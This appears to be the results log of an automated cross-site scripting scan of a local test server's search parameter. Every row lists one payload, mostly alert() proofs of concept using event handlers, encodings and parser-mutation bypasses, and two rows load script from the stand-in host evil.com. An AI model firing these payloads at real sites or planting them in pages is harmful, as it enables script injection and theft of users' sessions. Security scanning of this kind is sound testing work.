+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('al'+'ert(1)')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('al\x65rt(1)')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>[1].find(alert)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top['al'+'ert'](1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top[/al/.source+/ert/.source](1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>top[8680439..toString(30)](1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,&lt;script&gt;alert(1)&lt;/script&gt;,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,&#60;script&#62;alert(1)&#60;/script&#62;,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script/src=//evil.com></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script	src=//evil.com></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,src=//evil.com></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<template><slot onfocus=alert(1) autofocus></slot></template>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=text onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=password onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=email onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=number onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=search onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=tel onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=url onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=date onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=time onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=datetime-local onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=week onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=color onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=range onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=reset onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=submit onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<datalist onmouseover=alert(1)>X</datalist>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<custom-element onclick=alert(1)>X</custom-element>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img srcset=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<source srcset=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img loading=lazy src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img decoding=async src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img importance=high src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onabort=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onwaiting=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onseeking=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onseeked=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onplaying=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onplay=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpause=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadedmetadata=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onloadeddata=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onended=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondurationchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncanplaythrough=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncanplay=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<root><![CDATA[<script>alert(1)</script>]]></root>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.domain)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.location)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(navigator.userAgent)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(localStorage.getItem('test'))</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(sessionStorage.getItem('test'))</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>'alert\u0028document.domain\u0029'</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.name)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.safari)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.chrome)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blink onmouseover=alert(1)>X</blink>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<big onmouseover=alert(1)>X</big>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<center onmouseover=alert(1)>X</center>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dir onmouseover=alert(1)>X</dir>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<frame onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<frameset onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<noframes onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<strike onmouseover=alert(1)>X</strike>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<tt onmouseover=alert(1)>X</tt>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1);alert(2);alert(3)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>for(i=0;i<3;i++){alert(i)}</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>while(1){alert(1);break}</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>if(1){alert(1)}</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>try{alert(1)}catch(e){}</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)||alert(2)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)&&alert(2)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)?alert(2):alert(3)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert([1,2,3])</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert({x:1,y:2})</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(function(){return 1}())</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert((()=>1)())</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(class{constructor(){return 1}})</script>,NO_REFLECTION,No,,Info
